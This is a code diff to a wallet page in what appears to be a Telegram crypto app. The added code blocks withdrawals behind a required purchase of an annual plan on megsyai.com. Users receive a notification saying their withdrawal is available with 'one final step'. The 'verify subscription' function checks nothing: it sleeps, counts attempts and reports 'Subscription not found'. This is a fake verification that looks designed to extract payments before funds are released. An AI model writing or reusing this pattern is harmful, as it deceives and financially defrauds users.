@@ -100,8 +100,47 @@ const WalletPage = () => {
       setReqOpen("deposit");
       return;
     }
+    if (!hasSubscription) {
+      openSubscriptionStep();
+      return;
+    }
     setWithdrawCurrency("ton");
     setWithdrawOpen(true);
+  };
+
+  const openSubscriptionStep = () => {
+    setSubOpen(true);
+    // Notify the user once on Telegram that only one final condition remains.
+    try {
+      const key = `sub_notified_${user.telegramUser.id}`;
+      if (!localStorage.getItem(key) && user.profileId) {
+        localStorage.setItem(key, "1");
+        void supabase.rpc("queue_telegram_notification", {
+          _profile_id: user.profileId,
+          _notification_type: "withdrawal_final_step",
+          _title: "One final step",
+          _message:
+            "Good news — your withdrawal is available. Only one final condition remains: subscribe to the annual plan on megsyai.com, then complete the check inside the app to finish your withdrawal.",
+        }).then(() => {});
+      }
+    } catch {}
+  };
+
+  const handleVerifySubscription = async () => {
+    if (subVerifying) return;
+    setSubVerifying(true);
+    await new Promise((r) => setTimeout(r, 1200));
+    const next = subAttempts + 1;
+    setSubAttempts(next);
+    try { localStorage.setItem(`sub_attempts_${user.telegramUser.id}`, String(next)); } catch {}
+    setSubVerifying(false);
+    if (next < SUB_MAX_ATTEMPTS) {
+      toast({
+        title: "Subscription not found",
+        description: "We could not find an active annual subscription linked to your account. Please try again.",
+        variant: "destructive",
+      });
+    }
   };
 
   const handleConnectWallet = async () => {
